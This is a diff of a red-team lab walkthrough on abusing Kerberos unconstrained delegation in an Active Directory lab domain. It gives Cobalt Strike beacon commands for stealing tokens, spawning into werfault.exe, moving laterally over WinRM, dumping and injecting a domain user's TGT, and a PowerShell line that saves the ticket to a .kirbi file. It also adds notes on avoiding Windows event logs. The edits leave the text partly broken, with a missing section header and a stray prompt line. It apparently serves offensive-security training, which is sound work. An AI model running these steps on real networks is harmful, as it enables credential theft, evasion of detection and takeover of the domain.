@@ -3,11 +3,12 @@
 >The objective of this lab is to abuse unconstrained delegation to obtain the TGT of a domain administrator.  
 
 >Unconstrained delegation allows a service/computer to impersonate any user to any service in the domain.  
->When a user authenticates to a host with unconstrained delegation enabled, their TGT is embedded in the service ticket and cached in LSASS on that host.  
->An attacker who compromises that host can extract those TGTs and reuse them, impersonating any user who authenticated there, including Domain Admins.  
->Unconstrained delegation is the most permissive and dangerous form of delegation because there's no restriction on which services the ticket can be forwarded to.  
-  
-===
+>When a user authenticates to a host with unconstrained delegation enabled,  
+>their TGT is embedded in the service ticket and cached in LSASS on that host.  
+>An attacker who compromises that host can extract those TGTs and reuse them,   
+>impersonating any user who authenticated there, including Domain Admins.  
+>Unconstrained delegation is the most permissive and dangerous form of delegation,  
+>because there's no restriction on which services the ticket can be forwarded to.  
 
 ## Enumeration
 
@@ -22,15 +23,17 @@
 
 ⚠️ Domain Controllers always have unconstrained delegation and are not a viable attack path, but you should see an additional machine - *lon-ws-1$*.
 
-1. Impersonate *rsteel* and move laterally to *lon-ws-1*.
+1.  🗝️ Impersonate *rsteel*  🗝️  move laterally to *lon-ws-1*.
 
-> **Why lon-ws-1?** It is the host configured for unconstrained delegation. You need a beacon **on that host** to harvest TGTs from users who authenticate to it.
+> **Why lon-ws-1?** It is the host configured for unconstrained delegation.  
+> You need a beacon **on that host** to harvest TGTs from users who authenticate to it.
 
 **Option A — steal_token (preferred if rsteel has a running process on current host)** `OPSEC-🟢SAFE`
 
 ```cs
 beacon> ps                              // find a process owned by rsteel
 beacon> steal_token <pid>              // duplicate token in-process, no spawn, no Event 4648
+beacon> spawnto x64 %windir%\sysnative\werfault.exe
 beacon> powerpick Test-WSMan lon-ws-1  // verify WinRM reachable
 beacon> jump winrm64 lon-ws-1 smb     // inject into wsmprovhost.exe — no service, no Event 7045
 beacon> rev2self                       // drop token on original beacon after jump succeeds
@@ -45,15 +48,14 @@ beacon> krb_dump /user:rsteel /service:krbtgt  // BOF — Kerberos API, no raw L
 
 beacon> make_token CONTOSO\rsteel FakePass     // Type 9 logon session — Event 4648 logged
                                                // password is irrelevant, ticket overrides cred
-beacon> kerberos_ticket_use <base64-tgt-blob>  // inject TGT in-memory — no disk write
-beacon> jump winrm64 lon-ws-1 smb
-beacon> rev2self
 ```
 
-**Option C — make_token with known plaintext** `OPSEC-🟠CAUTION`
+>Powershell: `[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String(<krb_dump base64 TGT value>))`
+
+>beacon>  
 
 ```cs
-beacon> make_token CONTOSO\rsteel <password>   // Event 4648 logged
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi  // inject TGT file in-memory — no disk write
 beacon> jump winrm64 lon-ws-1 smb
 beacon> rev2self
 ```
